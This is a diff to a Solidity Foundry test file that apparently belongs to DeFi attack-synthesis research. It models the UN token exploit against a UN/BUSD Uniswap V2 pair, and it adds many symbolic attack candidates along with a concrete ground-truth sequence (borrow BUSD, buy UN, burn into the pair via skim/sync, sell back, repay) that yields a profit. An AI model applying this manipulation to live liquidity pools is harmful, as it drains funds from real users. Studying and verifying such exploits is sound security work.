@@ -1,13 +1,14 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
-import "./AttackContract.sol";
-import "./UN.sol";
 import "@utils/QueryBlockchain.sol";
 import "forge-std/Test.sol";
+import {AttackContract} from "./AttackContract.sol";
 import {BUSD} from "@utils/BUSD.sol";
+import {UN} from "./UN.sol";
 import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
 import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
 import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
+
 contract UNTest is Test, BlockLoader {
     BUSD busd;
     UN un;
@@ -36,6 +37,7 @@ contract UNTest is Test, BlockLoader {
     uint256 totalSupplyun = 10000000000000000000000000;
     uint256 balanceOfunpair = 186912581853851065964787;
     uint256 balanceOfunattacker = 0;
+
     function setUp() public {
         owner = address(this);
         busd = new BUSD();
@@ -70,9 +72,11 @@ contract UNTest is Test, BlockLoader {
         un.transfer(address(pair), balanceOfunpair);
         un.setSwapPair(address(pair));
     }
+
     modifier eurus() {
         _;
     }
+
     function printBalance(string memory tips) public {
         emit log_string(tips);
         emit log_string("Busd Balances: ");
@@ -110,27 +114,33 @@ contract UNTest is Test, BlockLoader {
         emit log_string("");
         emit log_string("");
     }
+
     function attackGoal() public view returns (bool) {
         return busd.balanceOf(attacker) >= 1e18 + balanceOfbusdattacker;
     }
+
     function borrow_busd_owner(uint256 amount) internal eurus {
         vm.stopPrank();
         vm.prank(owner);
         busd.transfer(attacker, amount);
         vm.startPrank(attacker);
     }
+
     function payback_busd_owner(uint256 amount) internal eurus {
         busd.transfer(owner, amount);
     }
+
     function borrow_un_owner(uint256 amount) internal eurus {
         vm.stopPrank();
         vm.prank(owner);
         un.transfer(attacker, amount);
         vm.startPrank(attacker);
     }
+
     function payback_un_owner(uint256 amount) internal eurus {
         un.transfer(owner, amount);
     }
+
     function swap_pair_attacker_un_busd(
         uint256 amount,
         uint256 amountOut
@@ -138,6 +148,7 @@ contract UNTest is Test, BlockLoader {
         un.transfer(address(pair), amount);
         pair.swap(0, amountOut, attacker, new bytes(0));
     }
+
     function swap_pair_attacker_busd_un(
         uint256 amount,
         uint256 amountOut
@@ -145,11 +156,13 @@ contract UNTest is Test, BlockLoader {
         busd.transfer(address(pair), amount);
         pair.swap(amountOut, 0, attacker, new bytes(0));
     }
+
     function burn_un_pair(uint256 amount) internal eurus {
         un.transfer(address(pair), amount);
         pair.skim(attacker);
         pair.sync();
     }
+
     function check_cand000(
         uint256 amt0,
         uint256 amt1,
@@ -164,9 +177,10 @@ contract UNTest is Test, BlockLoader {
         swap_pair_attacker_busd_un(amt1, amt2);
         swap_pair_attacker_un_busd(amt3, amt4);
         payback_busd_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
+
     function check_cand001(
         uint256 amt0,
         uint256 amt1,
@@ -183,9 +197,10 @@ contract UNTest is Test, BlockLoader {
         swap_pair_attacker_busd_un(amt2, amt3);
         swap_pair_attacker_un_busd(amt4, amt5);
         payback_busd_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
+
     function check_cand002(
         uint256 amt0,
         uint256 amt1,
@@ -202,27 +217,350 @@ contract UNTest is Test, BlockLoader {
         burn_un_pair(amt3);
         swap_pair_attacker_un_busd(amt4, amt5);
         payback_busd_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
+
+    function check_cand003(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt5 >= amt0);
+        borrow_un_owner(amt0);
+        swap_pair_attacker_un_busd(amt1, amt2);
+        swap_pair_attacker_busd_un(amt3, amt4);
+        payback_un_owner(amt5);
+        require(!attackGoal(), "Attack succeed!");
+        vm.stopPrank();
+    }
+
+    function check_cand004(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt6 >= amt0);
+        borrow_un_owner(amt0);
+        burn_un_pair(amt1);
+        swap_pair_attacker_un_busd(amt2, amt3);
+        swap_pair_attacker_busd_un(amt4, amt5);
+        payback_un_owner(amt6);
+        require(!attackGoal(), "Attack succeed!");
+        vm.stopPrank();
+    }
+
+    function check_cand005(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt6 >= amt0);
+        borrow_un_owner(amt0);
+        swap_pair_attacker_un_busd(amt1, amt2);
+        burn_un_pair(amt3);
+        swap_pair_attacker_busd_un(amt4, amt5);
+        payback_un_owner(amt6);
+        require(!attackGoal(), "Attack succeed!");
+        vm.stopPrank();
+    }
+
+    function check_cand006(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt9 >= amt0);
+        borrow_busd_owner(amt0);
+        swap_pair_attacker_busd_un(amt1, amt2);
+        swap_pair_attacker_un_busd(amt3, amt4);
+        swap_pair_attacker_busd_un(amt5, amt6);
+        swap_pair_attacker_un_busd(amt7, amt8);
+        payback_busd_owner(amt9);
+        require(!attackGoal(), "Attack succeed!");
+        vm.stopPrank();
+    }
+
+    function check_cand007(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt10 >= amt0);
+        borrow_busd_owner(amt0);
+        burn_un_pair(amt1);
+        swap_pair_attacker_busd_un(amt2, amt3);
+        swap_pair_attacker_un_busd(amt4, amt5);
+        swap_pair_attacker_busd_un(amt6, amt7);
+        swap_pair_attacker_un_busd(amt8, amt9);
+        payback_busd_owner(amt10);
+        require(!attackGoal(), "Attack succeed!");
+        vm.stopPrank();
+    }
+
+    function check_cand008(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt10 >= amt0);
+        borrow_busd_owner(amt0);
+        swap_pair_attacker_busd_un(amt1, amt2);
+        burn_un_pair(amt3);
+        swap_pair_attacker_un_busd(amt4, amt5);
+        swap_pair_attacker_busd_un(amt6, amt7);
+        swap_pair_attacker_un_busd(amt8, amt9);
+        payback_busd_owner(amt10);
+        require(!attackGoal(), "Attack succeed!");
+        vm.stopPrank();
+    }
+
+    function check_cand009(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt10 >= amt0);
+        borrow_busd_owner(amt0);
+        swap_pair_attacker_busd_un(amt1, amt2);
+        swap_pair_attacker_un_busd(amt3, amt4);
+        burn_un_pair(amt5);
+        swap_pair_attacker_busd_un(amt6, amt7);
+        swap_pair_attacker_un_busd(amt8, amt9);
+        payback_busd_owner(amt10);
+        require(!attackGoal(), "Attack succeed!");
+        vm.stopPrank();
+    }
+
+    function check_cand010(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt10 >= amt0);
+        borrow_busd_owner(amt0);
+        swap_pair_attacker_busd_un(amt1, amt2);
+        swap_pair_attacker_un_busd(amt3, amt4);
+        swap_pair_attacker_busd_un(amt5, amt6);
+        burn_un_pair(amt7);
+        swap_pair_attacker_un_busd(amt8, amt9);
+        payback_busd_owner(amt10);
+        require(!attackGoal(), "Attack succeed!");
+        vm.stopPrank();
+    }
+
+    function check_cand011(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt9 >= amt0);
+        borrow_un_owner(amt0);
+        swap_pair_attacker_un_busd(amt1, amt2);
+        swap_pair_attacker_busd_un(amt3, amt4);
+        swap_pair_attacker_un_busd(amt5, amt6);
+        swap_pair_attacker_busd_un(amt7, amt8);
+        payback_un_owner(amt9);
+        require(!attackGoal(), "Attack succeed!");
+        vm.stopPrank();
+    }
+
+    function check_cand012(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt10 >= amt0);
+        borrow_un_owner(amt0);
+        burn_un_pair(amt1);
+        swap_pair_attacker_un_busd(amt2, amt3);
+        swap_pair_attacker_busd_un(amt4, amt5);
+        swap_pair_attacker_un_busd(amt6, amt7);
+        swap_pair_attacker_busd_un(amt8, amt9);
+        payback_un_owner(amt10);
+        require(!attackGoal(), "Attack succeed!");
+        vm.stopPrank();
+    }
+
+    function check_cand013(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt10 >= amt0);
+        borrow_un_owner(amt0);
+        swap_pair_attacker_un_busd(amt1, amt2);
+        burn_un_pair(amt3);
+        swap_pair_attacker_busd_un(amt4, amt5);
+        swap_pair_attacker_un_busd(amt6, amt7);
+        swap_pair_attacker_busd_un(amt8, amt9);
+        payback_un_owner(amt10);
+        require(!attackGoal(), "Attack succeed!");
+        vm.stopPrank();
+    }
+
+    function check_cand014(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt10 >= amt0);
+        borrow_un_owner(amt0);
+        swap_pair_attacker_un_busd(amt1, amt2);
+        swap_pair_attacker_busd_un(amt3, amt4);
+        burn_un_pair(amt5);
+        swap_pair_attacker_un_busd(amt6, amt7);
+        swap_pair_attacker_busd_un(amt8, amt9);
+        payback_un_owner(amt10);
+        require(!attackGoal(), "Attack succeed!");
+        vm.stopPrank();
+    }
+
+    function check_cand015(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt10 >= amt0);
+        borrow_un_owner(amt0);
+        swap_pair_attacker_un_busd(amt1, amt2);
+        swap_pair_attacker_busd_un(amt3, amt4);
+        swap_pair_attacker_un_busd(amt5, amt6);
+        burn_un_pair(amt7);
+        swap_pair_attacker_busd_un(amt8, amt9);
+        payback_un_owner(amt10);
+        require(!attackGoal(), "Attack succeed!");
+        vm.stopPrank();
+    }
+
     function test_gt() public {
         vm.startPrank(attacker);
+        emit log_named_uint("amt0", 29100 * 1e18);
         borrow_busd_owner(29100 * 1e18);
         printBalance("After step0 ");
+        emit log_named_uint("amt1", busd.balanceOf(attacker));
+        emit log_named_uint("amt2", 91480714664455701397200);
         swap_pair_attacker_busd_un(
             busd.balanceOf(attacker),
             91480714664455701397200
         );
         printBalance("After step1 ");
+        emit log_named_uint("amt3", (un.balanceOf(attacker) * 93) / 100);
         burn_un_pair((un.balanceOf(attacker) * 93) / 100);
         printBalance("After step2 ");
+        emit log_named_uint("amt4", un.balanceOf(attacker));
+        emit log_named_uint("amt5", 3 * 1e22);
         swap_pair_attacker_un_busd(un.balanceOf(attacker), 3 * 1e22);
         printBalance("After step3 ");
+        emit log_named_uint("amt6", (29100 * 1e18 * 1003) / 1000);
         payback_busd_owner((29100 * 1e18 * 1003) / 1000);
         printBalance("After step4 ");
         require(attackGoal(), "Attack failed!");
         vm.stopPrank();
     }
+
     function check_gt(
         uint256 amt0,
         uint256 amt1,
@@ -239,7 +577,7 @@ contract UNTest is Test, BlockLoader {
         burn_un_pair(amt3);
         swap_pair_attacker_un_busd(amt4, amt5);
         payback_busd_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
